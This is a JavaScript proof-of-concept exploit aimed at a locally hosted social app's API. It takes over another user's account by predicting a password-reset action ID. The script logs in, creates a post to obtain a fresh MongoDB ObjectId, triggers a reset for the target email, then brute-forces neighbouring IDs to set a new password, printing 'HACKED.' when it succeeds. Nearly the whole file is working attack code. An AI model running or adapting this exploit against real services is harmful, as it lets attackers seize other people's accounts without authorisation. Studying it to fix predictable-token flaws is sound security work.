require('isomorphic-fetch');

// NEED REFACTOR!

const axios = require('axios');
const argv = require('optimist')
    .usage(
        'Usage: $0 --email [email for session create] --password [password] --target-email [target email] --new-password [hacked]'
    )
    .demand([ 'email', 'password', 'target-email', 'new-password' ]).argv;

// TOKEN OF EXISTING USER
const APP_URL = 'http://localhost:8081/api/v1/';

const BRUT_ID_DATA = [
    { counter: -1 },
    { counter: 1 },
    { counter: -1, seconds: 1 },
    { counter: -1, seconds: -1 },
    { counter: 1, seconds: 1 },
    { counter: 1, seconds: -1 },
    { seconds: 1 },
    { seconds: -1 }
];

function parseId(id) {
    return {
        seconds   : parseInt(id.slice(0, 8), 16),
        machineId : parseInt(id.slice(8, 14), 16),
        processId : parseInt(id.slice(14, 18), 16),
        counter   : parseInt(id.slice(18, 24), 16)
    };
}

function formatIdPart(dec, length) {
    let part = dec.toString(16);

    while (part.length < length) part = `0${part}`;

    return part;
}

function createId({ seconds, machineId, processId, counter }) {
    return (
        formatIdPart(seconds, 8) +
    formatIdPart(machineId, 6) +
    formatIdPart(processId, 4) +
    formatIdPart(counter, 6)
    );
}

function createNewId(idData, diff) {
    const newIdData = Object.assign({}, idData);

    for (const key in diff) {
        newIdData[key] += diff[key];
    }

    return createId(newIdData);
}

async function createTweet(token) {
    const { data } = await axios.post(`${APP_URL}tweets?token=${token}`, {
        data : {
            title    : 'Title',
            subtitle : 'Subtitle',
            text     : 'Text'
        }
    });

    if (!data.status) throw 'Create document error.';

    return data.data;
}

async function createSession(email, password) {
    const { data } = await axios.post(`${APP_URL}sessions`, {
        data : {
            email,
            password
        }
    });

    if (!data.status) throw 'Create session error.';

    return data.data.jwt;
}

async function createAction(email) {
    const { data } = await axios.post(`${APP_URL}users/resetPassword`, {
        data : {
            email
        }
    });

    if (!data.status) {
        if (data.error.code === 'NOT_FOUND') throw 'Email not exist';
        throw 'Create action error.';
    }
}

async function submitAction(id, password) {
    console.log('submitAction');
    const { data } = await axios.post(`${APP_URL}actions/${id}`, {
        data : {
            password,
            confirmPassword : password
        }
    });

    return data.status;
}

async function main(args) {
    const token = await createSession(args.email, args.password);
    const [ tweet ] = await Promise.all([
        createTweet(token),
        createAction(args['target-email'])
    ]);
    const parsedId = parseId(tweet.id);

    for (const diff of BRUT_ID_DATA) {
        const actionId = createNewId(parsedId, diff);

        console.log('TRY', actionId);

        const result = await submitAction(actionId, args['new-password']);

        if (result) {
            console.log('HACKED.');
            process.exit();
        }
    }
}

main(argv).catch(e => {
    console.error(e);
});
